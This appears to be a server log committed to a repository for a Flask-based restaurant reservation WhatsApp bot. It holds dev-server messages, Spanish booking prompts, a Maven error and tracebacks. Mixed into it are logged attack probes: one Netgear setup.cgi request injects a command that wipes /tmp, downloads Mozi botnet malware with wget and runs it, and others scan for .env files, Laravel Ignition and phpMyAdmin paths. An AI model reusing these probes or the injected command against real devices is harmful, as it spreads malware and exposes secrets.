@@ -1,0 +1,1629 @@
+ * Serving Flask app 'app'
+ * Debug mode: off
+[31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on http://127.0.0.1:5001
+[33mPress CTRL+C to quit[0m
+ * Serving Flask app 'bot'
+ * Debug mode: on
+[31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on http://127.0.0.1:5000
+[33mPress CTRL+C to quit[0m
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 775-601-034
+127.0.0.1 - - [19/Oct/2022 21:43:03] "GET /send-message?msg=Día_2099-10-14,_Hora:_21:00,_Cantidad_de_personas:_5.%0A_Responde_'Rechazar_5'_para_rechazarla..%0A_Responde_'Confirmar_5'_para_confirmarla. HTTP/1.1" 200 -
+127.0.0.1 - - [19/Oct/2022 21:43:23] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [19/Oct/2022 21:43:40] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [19/Oct/2022 21:50:41] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [19/Oct/2022 22:23:19] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [19/Oct/2022 22:23:19] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [19/Oct/2022 22:46:49] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [19/Oct/2022 22:46:49] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [19/Oct/2022 22:51:25] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [19/Oct/2022 22:51:29] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [19/Oct/2022 22:51:36] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [19/Oct/2022 22:51:46] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [19/Oct/2022 22:52:03] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [19/Oct/2022 22:52:09] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [19/Oct/2022 22:52:15] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [19/Oct/2022 22:52:26] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [19/Oct/2022 23:40:56] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [19/Oct/2022 23:40:56] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [19/Oct/2022 23:48:52] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [19/Oct/2022 23:57:17] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [20/Oct/2022 00:03:25] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [20/Oct/2022 00:03:25] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [20/Oct/2022 00:04:18] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [20/Oct/2022 00:04:18] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 00:15:23] "[33mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 00:42:31] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 00:46:31] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 00:46:32] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 00:46:33] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 00:46:33] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 00:46:34] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 00:46:35] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 00:46:35] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 00:46:36] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 00:46:37] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 00:46:37] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 00:46:38] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 00:46:39] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 00:46:39] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 00:46:40] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 00:46:41] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 00:46:42] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 00:46:42] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 00:46:43] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 00:51:13] "GET /send-message?msg=Día_2099-10-14,_Hora:_21:00,_Cantidad_de_personas:_5.%0A_Responde_'Rechazar_6'_para_rechazarla..%0A_Responde_'Confirmar_6'_para_confirmarla. HTTP/1.1" 200 -
+127.0.0.1 - - [20/Oct/2022 00:55:27] "GET /send-message?msg=Día_2099-10-14,_Hora:_21:00,_Cantidad_de_personas:_5.%0A_Responde_'Rechazar_7'_para_rechazarla..%0A_Responde_'Confirmar_7'_para_confirmarla. HTTP/1.1" 200 -
+127.0.0.1 - - [20/Oct/2022 00:56:50] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [20/Oct/2022 00:56:55] "POST / HTTP/1.0" 200 -
+ * Detected change in '/home/g4428/repos/eatout/bot_wpp/external.py', reloading
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 775-601-034
+ * Serving Flask app 'bot'
+ * Debug mode: on
+[31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on http://127.0.0.1:5000
+[33mPress CTRL+C to quit[0m
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 537-605-857
+ * Serving Flask app 'app'
+ * Debug mode: off
+[31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on http://127.0.0.1:5001
+[33mPress CTRL+C to quit[0m
+127.0.0.1 - - [20/Oct/2022 01:24:53] "GET /send-message?msg=Día_2099-10-14,_Hora:_21:00,_Cantidad_de_personas:_5.%0A_Responde_'Rechazar_8'_para_rechazarla..%0A_Responde_'Confirmar_8'_para_confirmarla. HTTP/1.1" 200 -
+127.0.0.1 - - [20/Oct/2022 01:25:19] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [20/Oct/2022 01:28:59] "GET /send-message?msg=Día_2099-10-14,_Hora:_21:00,_Cantidad_de_personas:_5.%0A_Responde_'Rechazar_9'_para_rechazarla..%0A_Responde_'Confirmar_9'_para_confirmarla. HTTP/1.1" 200 -
+127.0.0.1 - - [20/Oct/2022 01:29:06] "POST / HTTP/1.0" 200 -
+ * Serving Flask app 'bot'
+ * Debug mode: on
+[31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on http://127.0.0.1:5000
+[33mPress CTRL+C to quit[0m
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 537-605-857
+127.0.0.1 - - [20/Oct/2022 01:32:52] "GET /send-message?msg=Día_2099-10-14,_Hora:_21:00,_Cantidad_de_personas:_5.%0A_Responde_'Rechazar_10'_para_rechazarla..%0A_Responde_'Confirmar_10'_para_confirmarla. HTTP/1.1" 200 -
+127.0.0.1 - - [20/Oct/2022 01:33:00] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [20/Oct/2022 01:33:45] "[31m[1mHEAD / HTTP/1.0[0m" 405 -
+ * Serving Flask app 'bot'
+ * Debug mode: on
+[31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on http://127.0.0.1:5000
+[33mPress CTRL+C to quit[0m
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 537-605-857
+ * Serving Flask app 'app'
+ * Debug mode: off
+[31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on http://127.0.0.1:5001
+[33mPress CTRL+C to quit[0m
+127.0.0.1 - - [20/Oct/2022 01:36:08] "GET /send-message?msg=Día_2012-10-14,_Hora:_21:00,_Cantidad_de_personas:_5.%0A_Responde_'Rechazar_11'_para_rechazarla..%0A_Responde_'Confirmar_11'_para_confirmarla. HTTP/1.1" 200 -
+127.0.0.1 - - [20/Oct/2022 01:36:19] "POST / HTTP/1.0" 200 -
+ * Serving Flask app 'bot'
+ * Debug mode: on
+[31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on http://127.0.0.1:5000
+[33mPress CTRL+C to quit[0m
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 537-605-857
+ * Serving Flask app 'app'
+ * Debug mode: off
+[31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on http://127.0.0.1:5001
+[33mPress CTRL+C to quit[0m
+[INFO] Scanning for projects...
+Downloading from central: https://repo.maven.apache.org/maven2/org/codehaus/mojo/maven-metadata.xml
+Downloading from central: https://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-metadata.xml
+Progress (1): 2.7/21 kBProgress (2): 2.7/21 kB | 2.7/14 kBProgress (2): 2.7/21 kB | 5.5/14 kBProgress (2): 5.5/21 kB | 5.5/14 kBProgress (2): 5.5/21 kB | 8.2/14 kBProgress (2): 5.5/21 kB | 11/14 kB Progress (2): 5.5/21 kB | 14/14 kBProgress (2): 5.5/21 kB | 14 kB   Progress (2): 8.2/21 kB | 14 kBProgress (2): 11/21 kB | 14 kB Progress (2): 14/21 kB | 14 kBProgress (2): 16/21 kB | 14 kBProgress (2): 19/21 kB | 14 kBProgress (2): 21 kB | 14 kB                              Downloaded from central: https://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-metadata.xml (14 kB at 14 kB/s)
+Downloaded from central: https://repo.maven.apache.org/maven2/org/codehaus/mojo/maven-metadata.xml (21 kB at 20 kB/s)
+[INFO] ------------------------------------------------------------------------
+[INFO] BUILD FAILURE
+[INFO] ------------------------------------------------------------------------
+[INFO] Total time:  2.161 s
+[INFO] Finished at: 2022-10-20T01:38:43Z
+[INFO] ------------------------------------------------------------------------
+[ERROR] No plugin found for prefix 'spring-boot' in the current project and in the plugin groups [org.apache.maven.plugins, org.codehaus.mojo] available from the repositories [local (/home/g4428/.m2/repository), central (https://repo.maven.apache.org/maven2)] -> [Help 1]
+[ERROR] 
+[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
+[ERROR] Re-run Maven using the -X switch to enable full debug logging.
+[ERROR] 
+[ERROR] For more information about the errors and possible solutions, please read the following articles:
+[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/NoPluginFoundForPrefixException
+127.0.0.1 - - [20/Oct/2022 01:40:30] "GET /send-message?msg=Día_2090-10-14,_Hora:_21:00,_Cantidad_de_personas:_5.%0A_Responde_'Rechazar_12'_para_rechazarla..%0A_Responde_'Confirmar_12'_para_confirmarla. HTTP/1.1" 200 -
+127.0.0.1 - - [20/Oct/2022 01:40:53] "[35m[1mPOST / HTTP/1.0[0m" 500 -
+Traceback (most recent call last):
+  File "/home/g4428/.local/lib/python3.9/site-packages/flask/app.py", line 2548, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/home/g4428/.local/lib/python3.9/site-packages/flask/app.py", line 2528, in wsgi_app
+    response = self.handle_exception(e)
+  File "/home/g4428/.local/lib/python3.9/site-packages/flask/app.py", line 2525, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/home/g4428/.local/lib/python3.9/site-packages/flask/app.py", line 1822, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/home/g4428/.local/lib/python3.9/site-packages/flask/app.py", line 1820, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/home/g4428/.local/lib/python3.9/site-packages/flask/app.py", line 1796, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+  File "/home/g4428/repos/eatout/bot_wpp/bot.py", line 17, in bot
+    res = update_status(res)
+UnboundLocalError: local variable 'res' referenced before assignment
+ * Serving Flask app 'bot'
+ * Debug mode: on
+Address already in use
+Port 5000 is in use by another program. Either identify and stop that program, or start the server with a different port.
+ * Serving Flask app 'app'
+ * Debug mode: off
+[31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on http://127.0.0.1:5001
+[33mPress CTRL+C to quit[0m
+127.0.0.1 - - [20/Oct/2022 01:44:19] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [20/Oct/2022 01:44:19] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 01:44:39] "GET /send-message?msg=Día_2090-10-14,_Hora:_21:00,_Cantidad_de_personas:_5.%0A_Responde_'Rechazar_13'_para_rechazarla..%0A_Responde_'Confirmar_13'_para_confirmarla. HTTP/1.1" 200 -
+127.0.0.1 - - [20/Oct/2022 01:44:58] "[35m[1mPOST / HTTP/1.0[0m" 500 -
+Traceback (most recent call last):
+  File "/home/g4428/.local/lib/python3.9/site-packages/flask/app.py", line 2548, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/home/g4428/.local/lib/python3.9/site-packages/flask/app.py", line 2528, in wsgi_app
+    response = self.handle_exception(e)
+  File "/home/g4428/.local/lib/python3.9/site-packages/flask/app.py", line 2525, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/home/g4428/.local/lib/python3.9/site-packages/flask/app.py", line 1822, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/home/g4428/.local/lib/python3.9/site-packages/flask/app.py", line 1820, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/home/g4428/.local/lib/python3.9/site-packages/flask/app.py", line 1796, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+  File "/home/g4428/repos/eatout/bot_wpp/bot.py", line 17, in bot
+    res = update_status(res)
+UnboundLocalError: local variable 'res' referenced before assignment
+ * Detected change in '/home/g4428/repos/eatout/bot_wpp/bot.py', reloading
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 537-605-857
+ * Serving Flask app 'app'
+ * Debug mode: off
+[31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on http://127.0.0.1:5001
+[33mPress CTRL+C to quit[0m
+ * Serving Flask app 'bot'
+ * Debug mode: on
+[31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on http://127.0.0.1:5000
+[33mPress CTRL+C to quit[0m
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 537-605-857
+127.0.0.1 - - [20/Oct/2022 01:47:16] "GET /send-message?msg=Día_2090-10-14,_Hora:_21:00,_Cantidad_de_personas:_5.%0A_Responde_'Rechazar_14'_para_rechazarla..%0A_Responde_'Confirmar_14'_para_confirmarla. HTTP/1.1" 200 -
+127.0.0.1 - - [20/Oct/2022 01:47:27] "POST / HTTP/1.0" 200 -
+ * Serving Flask app 'bot'
+ * Debug mode: on
+[31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on http://127.0.0.1:5000
+[33mPress CTRL+C to quit[0m
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 537-605-857
+127.0.0.1 - - [20/Oct/2022 01:49:02] "GET /send-message?msg=Día_2022-12-24,_Hora:_21:00,_Cantidad_de_personas:_2.%0A_Responde_'Rechazar_15'_para_rechazarla..%0A_Responde_'Confirmar_15'_para_confirmarla. HTTP/1.1" 200 -
+127.0.0.1 - - [20/Oct/2022 01:49:12] "POST / HTTP/1.0" 200 -
+ * Detected change in '/home/g4428/repos/eatout/bot_wpp/bot.py', reloading
+{"status":"OK","msg":"Reservación confirmada.","reservation":null}
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 537-605-857
+ * Serving Flask app 'bot'
+ * Debug mode: on
+[31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on http://127.0.0.1:5000
+[33mPress CTRL+C to quit[0m
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 537-605-857
+127.0.0.1 - - [20/Oct/2022 01:50:00] "GET /send-message?msg=Día_2022-12-24,_Hora:_11:00,_Cantidad_de_personas:_3.%0A_Responde_'Rechazar_16'_para_rechazarla..%0A_Responde_'Confirmar_16'_para_confirmarla. HTTP/1.1" 200 -
+127.0.0.1 - - [20/Oct/2022 01:50:08] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [20/Oct/2022 01:50:21] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [20/Oct/2022 01:52:07] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [20/Oct/2022 01:52:13] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [20/Oct/2022 01:52:25] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [20/Oct/2022 01:52:30] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [20/Oct/2022 01:52:34] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [20/Oct/2022 01:52:39] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [20/Oct/2022 01:54:43] "GET /send-message?msg=Día_2022-10-15,_Hora:_07:00,_Cantidad_de_personas:_1.%0A_Responde_'Rechazar_17'_para_rechazarla..%0A_Responde_'Confirmar_17'_para_confirmarla. HTTP/1.1" 200 -
+127.0.0.1 - - [20/Oct/2022 01:55:32] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [20/Oct/2022 01:57:10] "GET /send-message?msg=Día_2022-10-15,_Hora:_07:00,_Cantidad_de_personas:_1.%0A_Responde_'Rechazar_18'_para_rechazarla..%0A_Responde_'Confirmar_18'_para_confirmarla. HTTP/1.1" 200 -
+127.0.0.1 - - [20/Oct/2022 01:57:19] "GET /send-message?msg=Día_2022-12-24,_Hora:_11:00,_Cantidad_de_personas:_3.%0A_Responde_'Rechazar_19'_para_rechazarla..%0A_Responde_'Confirmar_19'_para_confirmarla. HTTP/1.1" 200 -
+127.0.0.1 - - [20/Oct/2022 01:57:33] "GET /send-message?msg=Día_TE_AMO_BEBELONSI_OLAA,_Hora:_11:00,_Cantidad_de_personas:_3.%0A_Responde_'Rechazar_20'_para_rechazarla..%0A_Responde_'Confirmar_20'_para_confirmarla. HTTP/1.1" 200 -
+127.0.0.1 - - [20/Oct/2022 01:57:47] "GET /send-message?msg=Día_2022-12-24,_Hora:_11:00,_Cantidad_de_personas:_3.%0A_Responde_'Rechazar_21'_para_rechazarla..%0A_Responde_'Confirmar_21'_para_confirmarla. HTTP/1.1" 200 -
+127.0.0.1 - - [20/Oct/2022 02:40:38] "[33mPOST /GponForm/diag_Form?images/ HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 03:08:52] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [20/Oct/2022 03:08:52] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 03:28:29] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [20/Oct/2022 03:28:30] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 03:39:24] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [20/Oct/2022 04:39:08] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [20/Oct/2022 04:39:08] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 05:17:30] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [20/Oct/2022 05:17:30] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 05:37:59] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [20/Oct/2022 05:37:59] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 05:52:21] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [20/Oct/2022 06:07:15] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [20/Oct/2022 06:32:37] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [20/Oct/2022 06:35:56] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [20/Oct/2022 06:35:56] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 06:37:15] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [20/Oct/2022 06:39:02] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 06:39:03] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 06:39:03] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 06:39:04] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 06:39:04] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 06:39:05] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 06:39:06] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 06:39:06] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 06:39:07] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 06:39:08] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 06:39:08] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 06:39:09] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 06:39:09] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 06:39:10] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 06:39:11] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 06:39:11] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 06:39:12] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 06:39:12] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 06:54:15] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [20/Oct/2022 06:54:15] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:10:52] "[33mGET /db/phpMyAdmin-4/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:10:52] "[33mGET /sql/sqladmin/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:10:52] "[33mGET /administrator/phpmyadmin/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:10:53] "[33mGET /phpmyadmin5/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:10:53] "[33mGET /phpMyAdmin-3/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:10:53] "[33mGET /db/webadmin/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:10:53] "[33mGET /phpMyAdmin-3/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:10:53] "[33mGET /sql/websql/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:10:53] "[33mGET /sql/sql/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:10:53] "[33mGET /mysql/pMA/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:10:53] "[33mGET /mysql/pma/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:10:54] "[33mGET /phpmyadmin2011/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:10:54] "[33mGET /administrator/phpMyAdmin/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:10:54] "[33mGET /php-my-admin/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:10:54] "[33mGET /administrator/PMA/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:10:54] "[33mGET /phpMyAdmin-4/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:10:54] "[33mGET /phpmyadmin2016/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:10:54] "[33mGET /phpmyadmin2012/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:10:54] "[33mGET /phpmyadmin2015/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:10:55] "[33mGET /phpmyadmin2017/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:10:55] "[33mGET /phpMyAdmin3/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:10:55] "[33mGET /mysqladmin/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:10:55] "[33mGET /admin/phpMyAdmin/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:10:55] "[33mGET /phpMyAdmin-5.1.0/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:10:55] "[33mGET /phpMyAdmin-4.9.10-all-languages/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:10:55] "[33mGET /phpmyadmin2014/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:10:55] "[33mGET /admin/phpmyadmin/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:10:56] "[33mGET /phpmyadmin2011/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:10:56] "[33mGET /phppma/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:10:56] "[33mGET /phpMyAdmin-5.2.0/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:10:56] "[33mGET /sql/phpmyadmin4/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:10:56] "[33mGET /_phpmyadmin_/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:10:56] "[33mGET /sql/sqlweb/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:10:56] "[33mGET /phpmyadmin2013/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:10:56] "[33mGET /admin/pma/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:10:57] "[33mGET /phpMyAdmin-latest-all-languages/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:10:57] "[33mGET /phpMyAdmin-5.3.0/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:10:57] "[33mGET /phpMyAdmin-5.1.2/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:10:57] "[33mGET /admin/web/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:10:57] "[33mGET /mysql/mysqlmanager/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:10:57] "[33mGET /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php?lang=en HTTP/1.0[0m" 404 -
